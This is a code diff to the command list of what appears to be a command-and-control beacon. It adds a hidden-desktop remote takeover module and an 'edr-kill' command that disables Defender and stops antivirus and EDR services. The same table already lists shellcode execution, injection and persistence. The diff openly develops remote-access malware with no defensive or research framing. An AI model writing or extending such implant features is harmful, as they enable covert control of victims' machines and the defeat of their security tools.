@@ -72,6 +72,8 @@ BEACON_COMMAND_LIST: list[tuple[str, str, str]] = [
     ("mem-run <b64>", "Run base64 shellcode in-memory", "win"),
     ("persist [method]", "Install persistence (runkey/systemd/cron)", ""),
     ("autopersist", "Auto-detect OS and install persistence", ""),
+    # ── remote session (standalone GUI takeover module) ──
+    ("remote [host] [port] [ssl]", "Deploy the Remote Session module (live screen stream + hidden-desktop control)", ""),
     # ── shell / config ──
     ("shell <cmd>", "Execute an OS command (bare command works too)", ""),
     ("sleep <ms>", "Set the check-in cadence", ""),
@@ -79,6 +81,7 @@ BEACON_COMMAND_LIST: list[tuple[str, str, str]] = [
     ("auth-rotate <b64-secret>", "Rotate this beacon's HMAC identity", ""),
     ("health", "Self-report: uptime, check-ins, cadence, errors", ""),
     ("edrcheck", "Probe loaded AV/EDR drivers", "win"),
+    ("edr-kill", "Disable Defender realtime + stop known AV/EDR services (needs SYSTEM)", ""),
     ("exit | kill", "Shut the beacon down", ""),
 ]
 
@@ -105,6 +108,7 @@ def _render_beacon_commands() -> str:
                            "screen-record", "screen-dump"),
             "location / wireless": ("gps", "wlan", "bt-scan"),
             "injection / persistence": ("inject", "migrate", "mem-run", "persist", "autopersist"),
+            "remote session": ("remote",),
             "shell / config": ("shell", "sleep", "set-sleep", "auth-rotate",
                                "health", "edrcheck", "exit"),
         }
